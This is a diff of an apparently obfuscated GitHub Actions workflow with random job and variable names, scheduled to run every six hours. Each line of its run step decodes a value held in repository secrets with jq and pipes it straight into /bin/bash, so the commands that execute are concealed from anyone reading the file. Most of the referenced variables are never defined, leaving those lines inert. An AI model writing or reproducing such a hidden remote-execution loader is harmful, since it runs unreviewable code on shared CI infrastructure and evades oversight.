@@ -1,9 +1,9 @@
 name: xieqianli3765
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
+    - cron: '26 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: xieqianli3765
         env:
-          y3: ${{ secrets.y3 }}
+          ljnl18: ${{ secrets.ljnl18 }}
         run: |
-          echo $y3 | jq -r .o9 | /bin/bash
-          echo $whggf8570 | jq -r .mtnd0631 | /bin/bash
-          echo $au7 | jq -r .hqw99077 | /bin/bash
-          echo $qgcoz0240 | jq -r .esyvz2 | /bin/bash
-          echo $mawjd152 | jq -r .ne4646 | /bin/bash
-          echo $mrz01 | jq -r .lncaq96932 | /bin/bash
-          echo $psn04 | jq -r .lum00885 | /bin/bash
-          echo $xvm83331 | jq -r .s4358 | /bin/bash
-          echo $kcgwz415 | jq -r .snvj456 | /bin/bash
-          echo $ijmr9 | jq -r .g6 | /bin/bash
-          echo $rm42322 | jq -r .e2351 | /bin/bash
-          echo $btk58149 | jq -r .logna8 | /bin/bash
+          echo $ljnl18 | jq -r .ratwk00 | /bin/bash
+          echo $ysfm1933 | jq -r .chi3546 | /bin/bash
+          echo $at237 | jq -r .tn25992 | /bin/bash
+          echo $iz22 | jq -r .kj70332 | /bin/bash
+          echo $xd8 | jq -r .peh03 | /bin/bash
+          echo $q79 | jq -r .muk4 | /bin/bash
+          echo $x6889 | jq -r .wbhd79 | /bin/bash
 
